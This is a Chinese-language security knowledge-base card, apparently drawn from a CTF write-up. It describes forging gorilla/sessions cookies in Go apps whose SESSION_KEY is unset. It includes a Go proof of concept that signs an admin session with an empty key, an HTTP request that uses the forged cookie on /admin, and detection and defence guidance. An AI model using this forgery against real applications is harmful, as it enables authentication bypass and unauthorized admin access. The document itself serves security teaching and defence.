---
id: web-golang-gorilla-sessions-empty-key-session-forgery
title: gorilla/sessions securecookie 空 SESSION_KEY：用空密钥自签 session-name 冒充 admin
type: scenario
domain: web
path: web/golang
technique: gorilla-sessions-empty-key-session-forgery
tags:
- go
- golang
- gorilla
- securecookie
- sessions
- session-forgery
- auth-bypass
- gin
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V649
  verified_at: '2026-11-13T04:05:10+08:00'
  notes: 已对照原文与图26-28核对：NewCookieStore([]byte(os.Getenv("SESSION_KEY"))) 空密钥、本地生成 session-name cookie 替换后访问 /admin 通过（图28 200）均一致。未验证点：PoC 为等价 httptest 示意，未在本机执行；原文未标注库版本，affected_versions 保持为空。
url: /docs/web/golang/web-golang-gorilla-sessions-empty-key-session-forgery/
draft: false
kb_aliases:
- gorilla/securecookie 空密钥
- SESSION_KEY 未设置
- cookie-session 伪造
- session-name=admin
- NewCookieStore 空 key
- Go 会话伪造
---

## 一句话结论

Go 应用用 `sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))` 初始化会话、但部署时未设置 `SESSION_KEY` 环境变量时，会话签名密钥就是空字符串；攻击者用同一库/本地同版本程序以空密钥签出 `name=admin` 的 cookie，替换 `session-name` 即可通过服务端验签，冒充管理员。

## 原理

- gorilla/sessions 的 CookieStore 由 gorilla/securecookie 实现：cookie 值 = 序列化数据 → 可选加密（有 encryption key 时）→ 对数据计算 HMAC（authentication key）→ base64。验签时服务端用同一密钥重算 MAC。
- `NewCookieStore(keyPairs ...[]byte)` 接收一对或多对密钥（认证密钥 + 可选加密密钥）。`os.Getenv("SESSION_KEY")` 在环境变量未设置时返回空字符串，`[]byte("")` 作为认证密钥传入——密钥为空、且对所有部署相同，攻击者完全可以复现签名过程。
- 由于没有加密密钥，cookie 内容本身也是明文（base64 后可见 gob 序列化数据）；攻击者只需构造 `map[interface{}]interface{}{"name":"admin"}` 并用空 key 调用 `securecookie.Encode`，或直接在本机跑一个同版本 Go 程序生成 cookie。
- 服务端只做 `store.Get(c.Request, "session-name")` 验签并读取 `session.Values["name"]` 做权限判断（不回查数据库、不绑定其他会话状态），因此伪造 cookie 即获得 admin。
- 即使不依靠空密钥，弱/默认 SESSION_KEY（如 "secret"、示例值）也可通过字典或源码泄露获得；空密钥是最直接的一种。

## 触发条件

- Go 应用使用 gorilla/sessions（或同族 securecookie）的 CookieStore，密钥来自环境变量/配置且部署时缺失或为弱值。
- 会话 cookie 仅由 HMAC 保护（无服务端存储、无加密或加密密钥同为空）。
- 权限判断直接信任 `session.Values` 中的字段（如 `name == "admin"`）。
- 攻击者能访问使用该会话的路由（如 `/admin`）。

## 利用步骤

1. 观察登录/首页响应，记录 cookie 名（如 `session-name`）与值格式（base64、`|` 分隔的时间戳/MAC）。
2. 判断密钥为空/弱：用本地同版本 gorilla/sessions 以 `[]byte("")` 生成 cookie 并请求受保护路由，若返回正常页面（而非 500/403）即验证成功。
3. 本地生成伪造会话：
   ```go
   store := sessions.NewCookieStore([]byte(""))
   // 用同一 cookie 名 name（如 session-name）
   ```
   构造 `Values["name"]="admin"` 并 Encode，得到新 cookie 值。
4. 替换请求 Cookie 中的 `session-name`，访问 `/admin`，确认返回管理页面/进入下一步（如模板注入）。
5. 若空密钥不成立，尝试弱密钥字典（源码/默认值/短字符串），或用已知密钥伪造。

## PoC

```go
package main

import (
    "fmt"
    "github.com/gorilla/sessions"
    "net/http/httptest"
)

func main() {
    // 目标环境 SESSION_KEY 未设置，等价于空密钥
    store := sessions.NewCookieStore([]byte(""))
    req := httptest.NewRequest("GET", "http://target/", nil)
    rec := httptest.NewRecorder()
    s, _ := store.Get(req, "session-name")
    s.Values["name"] = "admin"
    s.Save(req, rec)
    fmt.Println(rec.Header().Get("Set-Cookie")) // 复制该 cookie 值
}
```

```http
GET /admin HTTP/1.1
Host: <target>
Cookie: session-name=<forged-cookie>
```

## 变体与关联

- 变体：使用 `sessions.NewFilesystemStore` 时，空/弱 key 同样可伪造签名；若使用加密 key 为空但认证 key 非空，仍可伪造。
- 变体：密钥来自配置文件且文件可读（源码泄露/任意文件读）时，直接读取后伪造，无需爆破。
- 关联：[[web-golang-pongo2-gin-context-saveuploadedfile-debug-reload-rce]]（本卡常作为该链的前置：先伪造 session 进 /admin 再触发模板注入）；[[web-python-recursive-merge-class-pollution-globals-rce]]（Python 侧 SECRET_KEY 覆盖伪造会话的同类思路）。

## 检测与防御

- 检测：服务启动时校验 SESSION_KEY 非空且长度足够（>=32 字节）；会话 cookie 验签失败/异常比例升高；同一账号 cookie 来自不同生成环境（MAC 可复现但时间戳异常）。
- 检测：短时间大量请求携带格式正确但从未由服务端签发的 cookie；受保护路由出现无登录记录的访问。
- 防御：启动时 fail-fast——环境变量缺失/长度不足直接拒绝启动；密钥随机生成并安全保存（KMS/Secret Manager），定期轮换。
- 防御：权限判断不直接信任 cookie 内字段（服务端查库/绑定会话）；敏感会话加加密层并设置 HttpOnly/Secure/SameSite；不要把示例密钥写入默认配置。

## 备注

原文为国赛 go_session 题：`store := sessions.NewCookieStore([]byte(os.Getenv("SESSION_KEY")))` 且环境变量未设置；本地运行同版本程序生成 `session-name` cookie 替换后访问 `/admin` 成功（图 26-28），随后进入 pongo2 模板注入链。原文未标注库版本，affected_versions 省略。PoC 未在本机执行（代码为等价示意）。
